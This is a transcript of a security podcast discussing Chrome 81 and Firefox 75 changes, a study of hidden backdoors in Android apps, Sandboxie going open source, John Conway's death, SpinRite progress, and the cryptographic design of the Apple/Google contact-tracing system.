There will be, oh, there were a number of stories last week about major companies already preemptively banning all use of Zoom, just as a result of the bad press that happened, SpaceX and Google among them.  I understand the emotional reaction to the initial security troubles, but most of the headline-making was, as we said at the time, from high-profile Zoom bombing, which was mostly the result of lax security measures on the part of the conference organizer, you know, this was all new to everybody, or to hundreds of millions of users, at least, due to the massive rapid uptake of Zoom.  And, you know, it's probably a lot of people's first experience using the platform.  So it should surprise no one that some mistakes were made.



And to Zoom's credit, they've already fixed all of those defaults and done everything they can to shore things up.  But I think an independent security audit is probably now one of the many things that Zoom needs.  But I'm impressed by what I've continued to see.  I think they continue to make a lot of the right moves.



Browser news.  We've got a couple of little tidbits.  On schedule, or on coronavirus revised schedule, Google released Chrome 81 last week.  As expected, Chrome is becoming less tolerant, with the release of 81, Chrome has become less tolerant of mixed content images.  As we know, "mixed content" means that, whereas the underlying web page is delivered over a TLS authenticated and encrypted, thus HTTPS, connection, passive images, or actually passive content, are explicitly using HTTP rather than HTTPS.  And I say "explicitly" because, if an image's URL leaves off any protocol specification, that is, the HTTP or HTTPS, the browser will default to using the same protocol, HTTPS in this case, as the underlying web page.



Until Chrome 81, mixed content was being allowed because it was regarded as passive content.  Images, audio, video, and object links were all considered to be passive content.  That is to say, they were allowed to be pulled over HTTP; whereas scripts and iframes, things that are more active and potentially dangerous, were considered active content, so they were already being rigorously blocked from mixed content loading.  But Chrome 81 changes this.  From now on, or I might say unless it results in too much breakage, in which case Google could be seen to back off, Chrome will override even an explicit http:// URL protocol and actively replace it with https.  And if the asset content cannot be delivered over https, well, that's just too bad.  The image won't be loaded, and it will show as broken on the web page.  So that's happening now, and we'll see what the downstream consequences are for that.



Maybe it's just, you know, old web pages.  If the page itself was secure, and images are coming from presumably the same domain, then it's hard to see why they couldn't be secure, too.  And presumably Google has already done some instrumentation and telemetry and looked to see what was going on.



Chrome 81 also brings us a new feature, and that's Web NFC support.  This is a Worldwide Web Consortium, you know, W3C standard, now here in Chrome.  It will allow web pages to read and write to NFC tags when they're close to the user's laptop or computer.  As we know, NFC uses near field RF technology; and in fact NFC stands for Near Field Communications, which has a range down at these power levels of two to four inches, so virtually in contact with each other.



The initial release of this API supports a widely compatible universal data interchange format known as NDEF, standing for NFC Data Exchange Format.  It's a lightweight binary message format which is widely cross-NFC tag compatible.  At the moment, apps are able to access a device's underlying NFC API.  We see this, for example, with Apple Pay on iOS.  So having native NFC support in Chrome will open the opportunity for NFC to be available to a broad range of websites.



So we'll see how that goes.  Who knows what use it'll be put to.  But, for example, a web page that wasn't previously able to access an NFC security tag could potentially do that, whereas it wouldn't have had direct access before that.  Chrome 81 also fixed 32 different security problems of varying degrees.  None were critical.  Three were rated high.  And the rest were about half and half, split between medium and low security.  So not much to see there.



We were also just last week talking about the need to update to Firefox 74.0.1, which eliminated that pair of zero-day use-after-free memory vulnerabilities that were found being deployed in the wild in targeted attacks.  Now today we have Firefox 75.  It fixed a few problems.  And the only real thing that changed is that they've sort of upped the ante a little bit with their background telemetry collecting.  They'd always been collecting telemetry, or at least have been for a while, and they have explained what and why.  I've got a link to their page in the show notes, if anyone is concerned or worried.



What they said is that:  "Firefox collects telemetry data by default.  We collect this to help improve performance and stability of Firefox.  Telemetry data is made up of two data sets:  interaction data and technical data.  Interaction data includes information about your interactions with Firefox to us such as number of open tabs and windows, number of web pages visited, number and type of installed Firefox add-ons, and session length, as well as Firefox features offered by Mozilla or our partners such as interaction with Firefox search features and search partner referrals.  Technical data includes information about your Firefox version and language, device operating system and hardware configuration, memory, basic information about crashes and errors, outcome of automated processes like updates, safe browsing, and activations to us.



"When Firefox sends data to us, your IP address is temporarily collected as part of our server logs.  IP addresses are deleted after 30 days.  If you're interested, you can read more about how we handle your data in our in-depth documentation about our data platform."



And they finish, saying:  "We do not know about your specific interactions with Firefox.  We just know the number of tabs a user had opened and how long they were opened."  And in fact if you're using Firefox, in the URL you can put about:telemetry, which will display your browser's telemetry collected information, so you can get a sense for and see what stuff is being gathered and sent back.  And it's entirely possible to opt out of providing this feedback.



Firefox says:  "You can opt out of sending any Firefox telemetry information at any time.  If you opt out of sending telemetry data, we will also treat this as a request to delete any data we previously collected.  Data will be deleted within 30 days after you opt out."  So they're handling that responsibly.  Again, it is on by default; but if you go under the menu under Options > Privacy & Security and then look for Firefox Data Collection & Use, you'll find a box with some checkboxes, and you just turn off the ones that you're not comfortable with.



Okay.  So what's been added to Firefox 75?  Apparently, and I don't know what - it'd be interesting to know, like, behind the scenes what's really going on.  But they've decided that they wanted to know what a user's browser choice was, even if the user was not using Firefox, or presumably after a user has changed their default away from Firefox, or maybe is using a different browser.  So Firefox 75 now contains a new separate process which is launched by the Windows Task Scheduler once a day to ping a report back to Mozilla.  And apparently they actually use ICMP ping messages.  You know that pings can contain a data payload.  They often just contain, like very little of nothing.  But you can send data, if you're not concerned about it getting there and reliability and so forth.  So that's what they do.



So Mozilla explained of this change in 75, they said:  "With Firefox 75 we are launching a new scheduling task for Windows that will help us understand changes in default browser settings.  As with all other telemetry-related changes here at Mozilla, this scheduled task has gone through our data review, a process designed with user choice and privacy at its core."  They said:  "We're collecting information related to the system's current and previous default browser setting, as well as the operating system locale and version.  This data cannot be associated with regular profile-based telemetry data."  So it's a separate process being sent separately.  "If you're interested in the schema, you can find it here."



And they have provided a link, and I've got it in the show notes.  It does show you exactly the stuff that's being sent.  It's an XML file, and I looked at it.  It looks very innocuous.  They said:  "The information we collect is sent as a background telemetry ping every 24 hours.  We'll respect user-configured telemetry opt-out settings by looking at the most recently used Firefox profile.  We'll respect custom enterprise telemetry-related policy settings if they exist.  We'll also respect policy to specifically disable this task."



So anyone, I wanted to let our users know that's going on in case anyone cares.  Again, I'm sort of - I'd love to have been a fly on the wall to know why it is that they're wanting to get this, what they're interested about, what they think might be happening.  But anyway, that's happening.  So we're on the same page with Chrome 81 and Firefox 75.  And remember that since Chrome's 81 was delayed, Google still plans to skip 82 entirely.  Apparently they're like committed to this release schedule by version number.  And so they plan to deliver 83 on its regular schedule.  And they're still imagining that 83 will have TLS v1.0 and 1.1 again removed.  Remember they put it back, or they chose not to remove it as they were previously expecting to.  Now they say they're going to do that in 83.  I'll be surprised if that happens this year.  I think 83 is aimed at this summer.  And that still seems a little soon.



So once again, Android apps in the crosshairs.  This research was conducted by a team at Ohio State University, New York University, and the Helmholtz Center for information Security, known as CISPA.  The paper that resulted was titled "Automatic Uncovering of Hidden Behaviors from Input Validation in Mobile Apps."  It's a very clever approach.  The sheer volume, as we know, of Android apps submitted to the Google Play Store means that an automated first-pass screening system is the only possible means for even trying to put a dent in the task of discovering those that might have a hidden purpose.  Otherwise, and even so, it's possible to simply have malicious apps get lost in the crowd.



The abstract of their paper, I've got a link to the entire PDF in the show notes for anyone who's interested, the abstract reads:  "Mobile applications (apps) have exploded in popularity, with billions of smartphone users using millions of apps available through markets such as the Google Play Store or the Apple App Store.  While these apps have rich and useful functionality that is publicly exposed to end users, they also contain hidden backdoors that are not disclosed, such as backdoors and blacklists designed to block unwanted content.  In this paper, we show that the input validation behavior, that is, the way the mobile apps process and respond to data entered by users, can serve as a powerful tool for uncovering such hidden functionality."  This is just a very clever approach.



They said:  "We therefore have developed a tool, INPUTSCOPE, that automatically detects both the execution context of user input validation and also the content involved in the validation, to automatically expose the secrets of interest.  We have tested INPUTSCOPE with over 150,000 mobile apps, including popular apps from major app stores and preinstalled apps shipped on the phone, and found 12,706 mobile apps with backdoor secrets and 4,028 mobile apps containing blacklist secrets."



Okay.  So they note, deeper into the paper, they note that the problems they discovered were not just theoretical.  And citing from the paper, they said:  "Nor are such cases theoretical.  By manually examining several mobile apps" - which their INPUTSCOPE tool found as potentially bad - "we found that a popular remote control app with 10 million installs contains a master password that can unlock access even when locked remotely by the phone owner when the device is lost.



"Meanwhile, we also discovered a popular screen locker app with five million installs uses an access key to reset arbitrary users' passwords to unlock and enter the system.  In addition, we also found that a live streaming app with five million installs contains an access key to enter its administrator interface, through which an attacker can reconfigure the app and unlock additional functionality.  Finally, we found a popular translation app with 1 million installs containing a secret key to bypass the payment for advanced services such as removing the advertisements displayed in the app."



What they realized, these guys, was that secret backdoors or other behaviors are often accessed through the front door.  So they ran their static code analysis tool INPUTSCOPE against the input-handling logic of Android apps.  And they found a significant number of designed-in misbehavior.  And as they said, these were not obscure apps.  They took the top 100,000 most popular apps on Google Play, the 30,000 apps preinstalled on Samsung devices - how could you have 30,000 apps preinstalled on Samsung devices?  That's what the page says - and 20,000 taken from the alternative Chinese market Baidu.



The study examined two issues:  what proportion of apps exhibited secret backdoors, and how they might be used or abused.  So that's a total of 100,000 from Google Play, 30,000 preinstalled on Samsung devices, 20,000 taken from the equivalent Chinese market.  They examined two issues:  what proportion of apps exhibited secret backdoors and how they might be abused or used.  Of the 150,000 total, 12,706 exhibit a range of behaviors indicating the presence of some sort of backdoor.  That is to say, in the input handling logic, INPUTSCOPE found 12,706 had, like, code for special case handling of specific things - a secret access key, a master password, or secret commands - and another 4,028 that seemed to be checking user input against specific blacklisted words such as political leaders' names, incidents in the news, or racial discrimination.



Looking at the backdoors, both Google Play apps and those from alternate stores such as Baidu showed roughly the same percentage of apps falling into the backdoor category:  6.8% from Google Play, 5.3% from Baidu.  Interestingly, for preinstalled bloatware apps, that is, the apps that come preinstalled on phones, the percentage showing this behavior was double the other sources, at around 16%.  And this finding supports a public open letter that was sent to Sundar Pichai at Google last January by Privacy International, which was critical of the way preinstalled apps were often not scrutinized for privacy and security problems.  A separate Spanish study last year documented that the provenance of preinstalled apps was often shadowy, based on commercial relationships between phone makers that the end user would not be aware of. 



The team took a closer look at 30 apps, picked at random from apps with more than a million installs, the ones I was talking about, finding that one installed with the ability for someone to remotely log into its admin interface.  Others could reset user passwords, bypass payment interfaces, initiate hidden behaviors using secret commands, or just stop users from accessing specific, sometimes political content.



In Sophos's coverage of this research, they wrote:  "Perhaps the biggest consequence from the study is simply how many Google Play apps exhibit these behaviors.  While the Play Store is large, the fact that several thousand" - okay, 12 - "from among the top 100,000 apps have hidden backdoor behavior hardly inspires confidence.  And there is currently no easy way, short of the sort of weeks-long analysis carried out by the researchers using a dedicated tool, to know which apps operate this way."



Sophos's reporting concluded:  "That's not so much a backdoor as a blind spot, another problem Google's sometimes chaotic Android platform could do without."



LEO:  I'm not sure how I feel about this.



STEVE:  How so?



LEO:  Well, you explain to me.  So it's not at all unusual for a developer to put a backdoor of the kind that you described where I'm going to distribute this to some people.  I'll give them a special code so they don't have to see the ads without paying.  Or a developer, I mean, you see that all the time when you develop software, where a developer has a "god mode" that they can test, makes it easy for them to test.



STEVE:  Sure.



LEO:  It's not at all unusual for that to happen.  Is Sophos saying the very existence of those makes them vulnerable to fuzzing and other kinds of hacking?



STEVE:  No, because, well, for example there was an instance of a remote control app that had a remote authentication bypass secret password.



LEO:  Yeah, I mean, that's obviously bad, yeah.



STEVE:  Yeah.



LEO:  But they also refer to some apps, I mean, what percentage of these apps just have developer backdoors for bug testing and things like that?



STEVE:  Or like friends and family secrets.



LEO:  Right.  Is that inherently harmful?  Are they saying that's...



STEVE:  No.  So I agree with you.  It's not the case that all of these things are bad.  What their tool finds is that the apps have undocumented behavior.  And without looking more closely, we need to know what that is.  Or it would be nice to know what that is.



LEO:  I would say almost every program in the world has undocumented behavior.  That's not at all unusual.  Because, I mean, remember the Windows API secrets, the secret Windows codes that Microsoft never told you?  Unless they're inherently - if it makes it vulnerable somehow because they could be manipulated, that I would understand.  But I don't think...



STEVE:  Yeah, so I guess - so certainly less than, given the population breakdown they talked about, less than those 12,000 were malicious, but there were some that were.



LEO:  Well, that would be bad, obviously.



STEVE:  And we would hope that the majority are not.



LEO:  I guess the point is - see, I don't know why they mention the ones that are not.  Like, okay.  You found some that are malicious.  I think they inflated their numbers, is what I'm saying.



STEVE:  Well, and I think also they were enamored of their input. 



LEO:  That they could do it.



STEVE:  Their static analysis input tool.



LEO:  Right, that they could find them, yeah.



STEVE:  And said, look, look at all the special casing behavior we found.



LEO:  But that's just not - I just don't think that's inherently dangerous, that that, yeah, of course, good job.  But that's not inherently dangerous.  Some is, potentially.



STEVE:  Right, right.  I agree with you.  Bypassing the need to pay for it, nah, not so much.



LEO:  Yeah, right.



STEVE:  And speaking of Sophos, Sandboxie has gone open source.



LEO:  Oh, good.  That's great.



STEVE:  Yeah.  Yes, it is very cool.  For more than 15 years Sandboxie has been a Sophos project.  It's now been released into the open source community for its continued maintenance and evolution.  You and I, Leo, on Security Now! Episode 172, way back then, May 27th of 2008, our episode was titled "Sandboxie," where we took a deep dive into its operation.  I had apparently, looking back at the notes, I had interviewed the original author of it, and I brought everything I learned from my interview of him into that podcast and talked about it.



LEO:  I remember, yeah.



STEVE:  It was originally intended just to sandbox web browsers.  I think it was just, well, in fact it was to sandbox...



LEO:  Sandbox IE; right, right.



STEVE:  Sandbox IE, yes.  It was just meant to sandbox Internet Explorer.  Then it was broadened to others.  And now it's become a very capable general purpose application isolation wrapper where you can run any apps that you're uncomfortable with in the sandbox.  Sandboxie at a very low level intercepts any of the Windows API hooks which would be dangerous, things like file writing, so that the app thinks it wrote where it wrote, and if it then reads it back, it comes back, it thinks from there.  But it's actually sequestered that into the sandbox, and then you're later able to decide what you want to do with it.  Typically you just flush anything that it did because you want safety.



Anyway, I just wanted to let everyone know it's www.sandboxie.com.  It was always free, but the sense I got, I read a little bit of background, is that Sophos was thinking, you know, we've got other fish to fry now.  We're busy.  We're not giving this the attention that maybe it deserves.  Let's just let it loose into the open source community and so it can continue to live there, which is very cool.



LEO:  Yay.  Yeah, you know what, more stuff that should happen to.  Because if a company's not going to continue to move forward with it, give it away.



STEVE:  Yes, that's perfect.  So Leo, I think there'll be some intersection between us on this next topic, a little bit of miscellany.  I discovered Scientific American magazine...



LEO:  Yes, I know where you're going.



STEVE:  ...in my high school years.



LEO:  Me, too, yup.



STEVE:  It was incredibly influential for me since its science writing was pitched at just the right level.  Toward the back of every issue was a monthly column called "Mathematical Games," written by, and I imagine this guy's name is familiar to us all, Martin Gardner.  And he was quite influential.  Wikipedia noted that Gardner's "Mathematical Games" column became the most popular feature of the magazine and was the first thing - it certainly was for me - that many readers turned to.  In September of 1977, Scientific American acknowledged the prestige and popularity of Gardner's column by moving it from the back of the magazine to the very front.



LEO:  The main reason I subscribed.



STEVE:  Yes.  The column ran - and get this - from 1956.  Now that was a year after I was born, and probably one or two years before you were born.



LEO:  The year I was born.  It was the year I was born.



STEVE:  Ah, okay.  From '56 through 1981, with sporadic columns afterwards.  And it was the first introduction of many subjects that Gardner talked about to a wider audience.  And the point of this bit of history is that it was Martin Gardner's October 1970 column, published early in my sophomore year of high school, where Gardner introduced his readers to John Horton Conway's amazing Game of Life.  We've spoken of Conway's Game of Life many times through the years on this podcast.  Conway's creation was incredibly elegant in the simplicity of its rules and the complexity of its results.  And it rather clearly divided all people who were exposed to it into two camps:  those who thought it was the coolest thing they had ever seen, and those who thought that the first group might benefit from medication.



LEO:  I never got over the Game of Life.  Never.  It's the greatest thing ever.



STEVE:  No.  The world hasn't.  Needless to say, you and I were members of the first camp.  And the game at the time consumed me for a long time.  Wikipedia has a terrific page about Conway's Game of Life.  Anyone who's listening to this podcast who doesn't already know what we're talking about must go to the Wikipedia page.



LEO:  If you don't know what a "glider" is, go now.



STEVE:  And that glider gun up there in the upper right, which is emitting gliders.  There are some beautiful animated GIFs or GIFs, depending upon how you pronounce it.  The page is beautiful.  All of our desktop PCs and smartphones have implementations of Conway's Game of Life.  And while you're stuck at home waiting for this pandemic to subside, you will not be bored.



Sadly, I bring all this up because last Saturday, April 11th, COVID-19 claimed the life of John Horton Conway.  Wikipedia writes:  "John Horton Conway was an English mathematician active in the theory of finite groups, knot theory" - that's actually a thing, knot theory - "number theory, combinatorial game theory..."



LEO:  Knot theory is all about topology.  That's exciting stuff.



STEVE:  Yeah, that's very cool stuff, "...and coding theory.  He also made contributions to many branches of recreational mathematics, most notably the invention of the cellular automaton called the Game of Life.  Conway spent the first half of his long career at the University of Cambridge in England and" - unfortunately, as it turns out - "the second half at Princeton University in New Jersey" - and of course we know that New Jersey is one of the spots that's had a big flare-up of COVID - "where he held the title John von Neumann Professor Emeritus.  On 11 April 2020, at age 82, he died of COVID-19 at his home in New Jersey."



LEO:  So sad.



STEVE:  So I just wanted to mention that to our listeners.  Very influential.  So much, I mean, the Game of Life, it's so simple, yet what it does, what it produces is fantastic.  And, I mean, there's been so much work done, like it's a perfect place for a person to practice their coding skills.  What is the fastest life generator I can produce?  And there has been, I mean, there have been papers written about optimizing the speed at which you iterate over a group of cells which are still alive, how to not bother spending time in dead areas and predict, I mean, just really cool things.  There are things that move across the grid.  And of course, you know, "C" in the Game of Life is the speed of light, which in the physical universe is the fastest that anything can travel.  So of course you have C equals one grid per - one cell grid per iteration is C in the Game of Life.  And so you have different things that move at different percentages of C.  I mean, there's a whole vocabulary.  There's loaves and blinkers and gliders and spaceships.



LEO:  This is all based on three rules.  That's it.



STEVE:  Yes.



LEO:  It's three rules for how these things generate.



STEVE:  Yes.



LEO:  It's so cool.  It's so cool.  I just love it.  Yeah.  That's one of the reasons people do it because it's very easy to write a program that does it.



STEVE:  Yeah, yeah, yeah.  I mean, yeah.



LEO:  Just couldn't be easier.  It's so cool.



STEVE:  I have a little bit of SpinRite news.  I am finally making very good progress toward the next SpinRite.  I had a surprising number of challenges getting to where I've finally been for the last four days.  Since I plan to be spending a lot of time during this development cycle working on a combination of SpinRite 6.x releases, and also the Beyond Recall utility which will be born from this work, I wanted to set things up right.  I wanted to invest in the creation of an efficient development environment so I would not be spending a lot of time in repetitive and unnecessary overhead.



Turns out that the lack of support for 16-bit code by today's 64-bit OSes, coupled with the fact that my tool chain turns out to depend upon a number of 16-bit components, was a lot more troublesome than I expected.  I also needed to link the DOS, the physical DOS testing target machines, which only know about SMBv1, that's the latest version of file sharing that - remember it was Windows for Workgroups is what Microsoft called it.  I needed to link them to file shares on a Win10 machine.  At my location with Lorrie I have Windows 10.  Where I am here in my Fortress of Solitude, I'm using Windows 7.  But I want to be able to develop in the evenings to keep working through the evenings under Windows 10.  And Windows 10 strongly resists having anything to do with that original SMBv1.  You have to do a whole bunch of things to get that working.



I also ended up investing, spending, consuming, and losing a week trying to get the Open Watcom remote debugger to work.  It's the only remote debugger that can still debug a DOS target machine from Windows.  It's incredibly finicky.  But I did finally manage to get it working, only to discover that it does not handle, believe it or not, included code in source files.  That is, if you try to step into or jump to code that's in an include, it shows you the proper line number, but it doesn't change the source file.  And I said, really?  And, I mean, I verified this with the maintainer of the Open Watcom project.  And he said, yeah, we don't do that.  I thought, okay, well, I can't use it.



So anyway, I finally ended up returning to my tried-and-true pure 16-bit tools.  And I have finally achieved my target in spades.  I have a highly efficient development and testing environment established and working.  And using that, I've been writing code for Intel's AHCI controller spec when it's in AHCI mode.  Remember that prior to this work, the work I'd been doing back in 2004, no, in 2013 is when I was working on - when I stopped working on SpinRite 6 in order to do SQRL.  So it was in 2013 we still had legacy mode for the controller.  And most systems still had that.  It was something you were able to choose in the BIOS.



And so what we know is that the next SpinRite needs to know how to talk to AHCI controllers in their native AHCI mode.  So that's the code that I'm writing now.  Most modern systems will be in AHCI mode.  And in fact, the latest AHCI hardware has dropped support for legacy mode altogether because it's not needed by any current OSes and won't be possible to switch back into legacy mode.  So I have support for that.  That I wrote back in 2013.  SpinRite will still have that.  But what I'm working now on is full-on AHCI controller.  And once I got this environment established four days ago, I plowed into the AHCI controller spec and began writing code.



What I discovered is that Intel's AHCI controller is an amazing piece of engineering.  A week ago it seemed large, mysterious, daunting, and opaque.  Today I can report that to me it now seems clear and obvious.  I feel like I've obtained the mindset that the engineers who originally defined it had, and it all makes perfect sense.  So I'm very excited to put it through its paces.  And when I head back to my place with Lorrie this evening, I'll sit down and continue writing code.  So I expect to have something for the early release testers to begin pounding on very shortly.  So getting there.



LEO:  There is, I should have mentioned, an xkcd comic eulogizing John Conway.  It could have been your Picture of the Week.



STEVE:  Yup.  I didn't see it until too late.  It's very cool.



LEO:  Yeah, let me refresh this.



STEVE:  It repeats.



LEO:  It starts here with a person, yeah.



STEVE:  Yup.



LEO:  And then there he goes.



STEVE:  Very nicely done.



LEO:  Yeah.  That's really sweet, actually.  I think Conway would have loved it.



STEVE:  Yeah.  Okay.  So what we know is that Apple and Google have engineers, crypto people; have gotten together and designed something which they are immediately implementing.  I think they're working, both of them, on putting this into APIs on their respective platforms, to which applications can be written.  But they've also said that, because they recognize that the potential need for contact tracing is not going away anytime soon, they intend to, as soon as they can, submerge this technology into the underlying OS, so contact tracing with this design will be part of both iOS and Android moving forward.  So what I want to do is first explain exactly what the technology is, exactly how it works.  And then, Leo, you and I will discuss the implications and upsides and downsides and spoofing and all the other things.



Okay.  And I should just mention that even when this is submerged into the phone, it's interesting, notice it's not contact tracking, because I'm sure "tracking" is a bad word, it's contract "tracing."  But even so, I'm sure there will be a setting to turn it off if you don't want that feature on in your iOS or Android device.  So all of this is explicitly opt-in and if the user chooses to participate in this.  And I was listening to you talk about this in MacBreak Weekly and agreeing that this potentially offers enough collective benefit, and I think we will see from the technology that they have really dealt with the arguments that uninformed people have that this makes a lot of sense.



Okay.  So when contact tracing is first brought up on a device - iOS, Android, whatever.  And you're right, Leo.  For people who don't have smartphones, it would be entirely possible to have a little credit card-size puck of some sort which is only a Bluetooth beacon thing, to have like some lower cost alternative, if there was some reason to do that.  So you could certainly do that.  So each instance synthesizes from high entropy a single master tracing key.  So that is, so it's a 256-bit master ID for the device.  There's only one of them.  It is well protected, never a need for it to be changed.  So each device has this single master key.



From that a tracing key - so I'm sorry, there's the master tracing key.  From that a daily tracing key, which is half the size, it's 128-bit, is deterministically derived from hashing the master tracing key with the Unix epoch day number, which we know is the number of days since January 1st, 1970.  So this tracing key, the daily tracing key, changes every day, once per day, and it's derived from the master tracing key.  But because the daily tracing key is the output of an HMAC-based key derivation function, the master tracing key is never revealed, and the daily sequence of daily tracing keys cannot be predicted.  So however, as we'll see, and this is important, the device that contains the master tracing key can itself, because it alone has the master tracing key, it can recreate any previous days' daily tracing keys that it may choose to.  And we'll see why that's important here in a second.



Okay.  If the user of the device should subsequently test positive for COVID-19, the user can instruct the device to upload to a regional health server a block of previous days' daily tracing keys for the period during which they may have been contagious.  So we'll just sort of hold that thought for a second because there's more we need to explain.  But I wanted to explain where - so there's the master key.  The master key is hashed with the day in order to produce a daily key which, because the day changes every day, that daily key changes every day.



But the way this is designed, the way they designed it this way is that, if at some point, any point in the future you were to test positive for COVID-19, you could say, oh, shoot, and you could upload to a shared server - and we'll talk about the way that's done in a second - the set of previous days' tracing keys.  They don't reveal the master key.  They're just the tracing keys that you had had on earlier days.  So the point is, because they are derived from the day number, you don't need to store those daily tracing keys.  You can get them any time you want.



Okay.  So we've got a daily tracing key.  The thing that is actually transmitted in the Bluetooth beacon is called a Rolling Proximity Identifier.  Oh, and I forgot to mention because this reminds me here again, the tracing key is half size.  Remember the master key is 256 bits.  We want 256 bits for maximum entropy so we don't get collisions among these randomly chosen tracing keys because they're all just chosen independently.  The daily tracing key is a compromise.  Because they do transact online, they need to be stored in a server, and the only real need is to avoid collisions.  It's a half-size key, 128-bit key, which provides still plenty of entropy.  But it was chopped in half just because there was no need there for 256 bits.



Okay.  So the rolling proximity identifier is also a half size, that is, chopped in half.  It's a 16-byte, 128-bit value sent out as the beacon from all participating devices.  We've discussed several times in the past how to prevent Bluetooth tracking.  All modern devices already randomize their Bluetooth MAC addresses.  Those MAC addresses change on a random schedule between once every 10 to 20 minutes, so on average every 15 minutes.  So but when you see 15 minutes, think of, well, yeah, but actually it's between 10 and 20 minutes.  The device chooses a time period in the future between 10 and 20 minutes to next rotate or pick a new Bluetooth MAC address.



The system's rolling proximity identifier, which is a thing that is actually sent, it is changed synchronously with the MAC address changes.  So the rolling proximity identifier changes with the MAC address.  When the user has enabled contact tracing, every time their Bluetooth MAC address changes, a new rolling proximity identifier is generated.  That's the actual data contained by the Bluetooth packet.  Since the Bluetooth MAC address and the rolling proximity identifier change synchronously, what that means is that no single identifier will straddle MAC addresses, and no single MAC address will straddle identifiers.  That means it's not possible to link and track contact tracing by MAC address or vice versa.



The value of this 128-bit rolling proximity identifier is also fully deterministic, fully determined.  It's derived from that daily tracing key and a 10-minute window number from the start of the day.  So you take the number of seconds so far that you are into the day, divide that by the number of seconds in 10 minutes to get an integer, which is essentially the 10-minute interval that you're in.  So that's something that will be changing every 10 minutes throughout the day.



So everyone who's voluntarily participating in this contact tracing system is emitting 128-bit identifiers which are ultimately derived from their master, that grand master 256-bit master tracing key, which in turn creates a daily tracing key based on the day of the epoch that we're all in together, the number of days since January 1st, 1970.  Which is then used, it's hashed along with the 10-minute window of the time of day to create a proximity, this rolling proximity identifier which changes every 10 minutes.  And this was cleverly done.  They clearly did this on purpose.  Notice that since the MAC address changes every 10 to 20 minutes, and the rolling proximity identifier is calculated on a 10-minute scale, no two sequential MAC addresses can ever have the same rolling proximity identifier.  So this was carefully assembled to ensure privacy.



Okay.  So we have a system where participating devices are broadcasting an identifier, which changes unpredictably from the outside once every 10 to 20 minutes.  And again, because it changes with the MAC address, and the MAC address interval is deliberately fuzzed, it's on an average of every 15 minutes, and every participating device is also collecting all of the similar incoming 128-bit rolling proximity identifiers from everyone nearby.  You could also use, for example, the received signal strength identifier, if you wanted to get some sense of the physical proximity of the two devices.



So, for example, the API might say, well, yes, we received the beacon, but my god, the received signal strength is so low that that's probably further away than viral contamination could occur, so we're not going to bother with that one.  So there might be a receive signal strength threshold below which the beacons, even though they are received, they're ignored as just being unlikely to actually represent, the other person or you, represent a threat to either of you.



Okay.  So if the device has not before seen the 128-bit rolling proximity identifier, it will be maintaining a list of them.  So if it hasn't seen it, it will add it to the list.  And since there's no need to retain previously received rolling proximity identifiers forever, they can be and will be deleted from the receiving devices after they've aged out at what I've seen written is 21 days.  That could be changed to 28, or it could be whatever.  But the point is you don't need to keep them forever.



Okay.  So now, someone who's been participating tests positive for COVID-19.  If they choose to, that is, presumably at their discretion - maybe they don't have a choice in China.  I don't know.  But here in the U.S. we probably still have a choice.  At their discretion, to help the world and to help protect their friends and family, they choose to notify everyone whom they may have been in contact with during the days prior to their diagnosis, when presumably they were contagious.  So they instruct their device to notify the world.  Their device alone contains that single, derived from pure entropy, master tracing key which, based upon the Unix epoch day, derives the daily tracing key.  So the device goes back some number of days and uploads each day's tracing key, during which time they may have been contagious.  And in the process we relabel these tracing keys "diagnosis keys."  Once they have been associated with a COVID-19 positive individual, they become diagnosis keys by definition. 



So think about this.  All of the rolling proximity identifiers which were emitted by that user's device on any given day were derived solely from that daily tracing key and the time of day in those 10-minute windows.  That means that anyone else who obtains those daily tracking, I'm sorry, those daily tracing keys, now called "diagnosis keys," anyone who obtains those diagnosis keys is also able to re-derive the same set of Bluetooth beacons that the COVID-19 positive user's device transmitted that day.



So on the receiving end, every participating user's device periodically downloads all of the daily diagnosis keys, presumably from people in their region because there's no reason to get them from countries you are not located in, and presumably only since you last downloaded them.  So it might be daily thing.  You might tell the server last time I checked in was this time and date.  Give me any new diagnosis keys for where I am now or within some region that I haven't previously seen.  For any new keys that the device has not already received, the user's device simply recreates the original rolling proximity identifiers which were originally derived from the now believed to be infected user under their tracing key.  They use what we now call the "diagnosis key" to recreate the same set of rolling proximity identifiers, and they check their list.



Remember, they're storing all the ones that they've seen, so they look for a collision, that is, do any of the resynthesized rolling proximity indicators match any that were received during the last 21 days.  If so, the person knows they have had a potential exposure to somebody who has since claimed that they are COVID-19 positive.  They have no idea who; they have no idea when.  Well, actually they would know what day it was, and presumably their device might choose to tell them this was the day that a collision was found.  So if there are any matches, the recipient user knows that someone whose device theirs was close enough to, presumably, well, to exchange Bluetooth beacons and presumably with a high enough received strength indication, has posted a diagnosis key that generated a rolling indicator that they received that day.



So that's the system.  It is carefully thought out.  I've gone through the spec.  I've looked at the crypto.  These guys didn't miss anything.  And so that's the system that, apparently without any modification, iOS and Android will both have in short order.  We need applications, and we also need to do something about the things that can go wrong.



So what can go wrong?  Moxie Marlinspike, who has earned and deserved everyone's respect as a crypto-savvy researcher - he developed Signal and did a stunning job with Signal.  Apparently, in what I presume are an initial bunch of tweets, he got some things wrong.  And I presume it's just because he didn't have time to sit down and read through the spec carefully because, for example, he was immediately worried about MAC address tracking, and the spec explicitly explains how that cannot happen.  There is no fixed Bluetooth MAC address that can be associated with these tokens by design.



He also talked about huge amounts of bandwidth being consumed.  I assume that he was presuming that the tokens themselves are what would be transacted, rather than the diagnosis keys.  One of the cleverest things about this is that we have HMAC-based keying that only allows these things to be generated in a forward-going manner; and the diagnosis key, knowing the day, allows you to resynthesize all of the individual rolling keys.  So anyway, these guys, from a crypto standpoint, they have produced a very powerful system.



One non-malicious problem that could arise is that radio proximity does not perfectly match viral propagation proximity.  In other words, the way I think of it is your device, for example, might be exchanging beacons with people in the apartment above, below, and to either side of yours.  But depending upon how well this received strength indication is used, assuming it is, that doesn't mean because you can receive their radio signal that they would represent a source of viral contagion.  So the system could potentially false positive if you happened to have your phones on either side of a wall so that the signal strengths were strong, and somebody on the other side of the wall later came down with COVID-19.



LEO:  What's the range of LE?  It's less than regular Bluetooth, I would bet.



STEVE:  That's a really good question.  I don't know.  You're right.  I don't know.



LEO:  It's Low Energy, so that sounds like it must be.



STEVE:  Yeah.  We ought to - that's a really good point.  I was just assuming it was the same 10 meters, thus 30 feet.  But it may be that it is enough shorter that, like, you're already going to need to be within sneezing distance in order to reach the other person.  And of course the other glitch is, and this is something I haven't seen, I haven't read anything about, is you don't want people spoofing their COVID-19 infections onto the server.  So, for example, you wouldn't want somebody going to a concert and spending the night in proximity to as many people as they possibly could and then misrepresenting the fact that they're now COVID-19 positive and causing a false positive alert to everyone.



